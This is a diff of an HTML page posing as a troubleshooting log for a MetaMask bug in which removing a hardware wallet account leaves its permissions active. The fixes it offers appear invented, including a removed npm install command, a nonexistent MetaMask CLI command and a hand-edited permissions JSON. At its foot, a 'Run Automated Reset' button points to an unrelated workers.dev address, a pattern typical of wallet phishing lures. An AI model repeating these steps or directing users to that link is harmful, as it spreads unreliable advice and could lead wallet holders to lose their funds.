@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #00adb5;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,16 +42,18 @@
 <h1>Metamask Extension Bug Permissions Removing Hardware Wallet Acc</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
+<li>Users are experiencing an issue where removing a hardware wallet account from Metamask does not clear the associated permissions, resulting in persistent access and potential security risks.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, which fails to properly revoke permissions when a hardware wallet account is removed, leading to lingering access control issues.</li>
+<li>The error occurs due to a bug in the Metamask extension, where the permissions are not properly updated when a hardware wallet account is removed, leading to a mismatch between the user's intent and the actual access control.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reinstall the Metamask extension to reset permissions: <code>npm install -g metamask-extension</code></li>
-<li>Manually edit the <code>permissions.json</code> file to remove lingering access controls:</li>
+<li>To resolve the issue, users can attempt the following manual overrides:</li>
+<li>Delete the Metamask extension and reinstall it</li>
+<li>Reset the Metamask account by deleting the local storage and clearing the browser cache</li>
+<li>Update the permissions manually using the following JSON configuration:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
 <span class="w">  </span><span class="nt">&quot;permissions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
@@ -60,17 +62,12 @@
 <span class="p">}</span>
 </code></pre></div>
 
-<ul>
-<li>Use the Metamask CLI to reset account permissions: <code>metamask reset-permissions --hardware-wallet</code></li>
-</ul>
-<p>You may want to consider using an external console to execute these commands for better control.</p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Metamask extension installed</li>
-<li>Hardware wallet account set up</li>
-<li>Node.js and npm installed for CLI commands</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/go-ethereum-error-in-block-freeze-operation-errcanonical-hash-m.html">Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</a></li></ul>
+<p>For advanced users, consider utilizing a terminal to inspect and modify the configuration. 
+Prerequisites:
+* Basic understanding of JSON configuration
+* Familiarity with Metamask extension settings
+* Access to the browser's developer tools</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-assets-confirming-the-add-token-from-a-d.html">Metamask Extension Bug Assets Confirming The Add Token From A Dapp</a></li><li><a href="./archive/2026/06/metamask-extension-bug-notifications-notification-badge-red-num.html">Metamask Extension Bug Notifications Notification Badge Red Num</a></li><li><a href="./archive/2026/06/metamask-extension-bug-multiple-wallets-syncdiscovery-for-socia.html">Metamask Extension Bug Multiple Wallets Syncdiscovery For Social</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
